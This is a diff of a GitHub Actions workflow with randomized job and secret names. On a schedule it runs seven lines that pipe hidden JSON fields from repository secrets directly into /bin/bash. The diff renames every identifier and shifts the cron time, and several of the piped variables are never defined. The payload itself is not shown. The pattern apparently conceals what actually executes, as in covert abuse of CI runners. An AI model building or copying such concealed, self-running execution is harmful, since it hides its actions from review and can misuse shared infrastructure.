@@ -2,21 +2,22 @@ name: longaodi2374
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 3/6 * * *'
-jobs:  # 12955
+    - cron: '10 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: longaodi2374
         env:
-          rpmwa9913: ${{ secrets.rpmwa9913 }}
+          zqk3: ${{ secrets.zqk3 }}
         run: |
-          echo $rpmwa9913 | jq -r .tzy93059 | /bin/bash
-          echo $i5 | jq -r .qjfn995 | /bin/bash
-          echo $a43 | jq -r .wffr564 | /bin/bash
-          echo $hrxhr152 | jq -r .fw91 | /bin/bash
-          echo $xq30 | jq -r .er90 | /bin/bash
-          echo $yrry9268 | jq -r .w2 | /bin/bash
-          echo $avfj0871 | jq -r .kla4799 | /bin/bash
+          echo $zqk3 | jq -r .o707 | /bin/bash
+          echo $hccbg3533 | jq -r .wdwv07 | /bin/bash
+          echo $wqb8094 | jq -r .fjhx79515 | /bin/bash
+          echo $d0171 | jq -r .f143 | /bin/bash
+          echo $vz4627 | jq -r .znrjo05 | /bin/bash
+          echo $dqfr38073 | jq -r .y765 | /bin/bash
+          echo $s05639 | jq -r .hy25 | /bin/bash
 
